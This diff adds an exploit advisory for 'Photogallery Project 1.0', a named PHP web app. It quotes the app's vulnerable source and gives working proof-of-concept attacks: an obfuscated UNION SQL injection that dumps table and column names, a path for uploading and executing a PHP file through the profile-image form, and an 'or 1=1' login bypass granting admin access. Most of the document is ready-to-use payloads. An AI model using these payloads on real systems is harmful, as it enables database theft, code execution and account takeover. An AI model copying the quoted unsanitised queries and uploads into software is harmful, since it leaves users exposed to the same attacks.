@@ -1,0 +1,78 @@
+# # # # #
+# Exploit Title: Photogallery Project 1.0 - Multiple Vulnerabilities
+# Dork: N/A
+# Date: 17.08.2017
+# Vendor Homepage : http://surajkumar.in/
+# Software Link: http://surajkumar.in/product/photogallery-project-in-php/
+# Demo: http://surajkumar.in/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands...
+# The vulnerability allows an attacker to access the normal member and administration panel...
+# The vulnerability allows an ordinary member upload arbitrary file...
+# 
+# Vulnerable Source:
+# # # # #
+# <?php
+# ....1
+# $pageContent=get_pages($_GET['page_id']);
+# ..
+# function get_pages($pageid){
+# $res=array();
+# global $connection;
+# if($pageid==0){
+# $fetchPages=mysqli_query($connection,"SELECT * FROM ".PAGE);
+# }else{
+# $fetchPages=mysqli_query($connection,"SELECT * FROM ".PAGE." WHERE id='$pageid'");
+# 
+# ....2
+# $userData=get_user_by_id($_SESSION['userID']);
+# if(isset($_POST['user_image'])){
+# $userImage=$_FILES['userImg']['name'];
+# $userTmpImage=$_FILES['userImg']['tmp_name'];
+# if(!file_exists('profile_pics'.'/'.$userImage)){
+# $img=$userImage;
+# }else{
+# $rand=rand(1,1000);
+# $img=$rand.'_'.$userImage;
+# }
+# if(move_uploaded_file($userTmpImage,'profile_pics'.'/'.$img)){
+# $updateImg=update_profile_img($img,$userData['userData']['id']);
+# if($updateImg['bool']==true){
+# 
+# ....3
+# if(isset($_POST['_login'])){
+# $data=array();
+# $data['email']=$_POST['_email'];
+# $data['password']=$_POST['_pass'];
+# $loginRes=user_login($data);
+# if($loginRes['bool']==true){
+# ....
+# ?>
+# # # # #
+# 	
+# Proof of Concept:
+# 
+# 1:
+# http://localhost/[PATH]/page.php?page_id=[SQL]
+# -1'+/*!22222UnIoN*/(/*!22222SeLeCT*/++0x283129,0x283229,0x283329,(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),/*!11111Concat*/(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e),0x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x),0x283529)+--+-&title=<h1>%49%68%73%61%6e%20%53%65%6e%63%61%6e</h1>
+# 
+# 2:
+# http://localhost/[PATH]/edit_profile_img.php?profile_id=[ID]
+# http://localhost/[PATH]/profile_pics/[FILE].php
+# 
+# 3:
+# http://localhost/[PATH]/login.php
+# http://localhost/[PATH]/admin
+# User: 'or 1=1 or ''=' Pass: 'or 1=1 or ''='
+# 
+# Etc...
+# # # # #
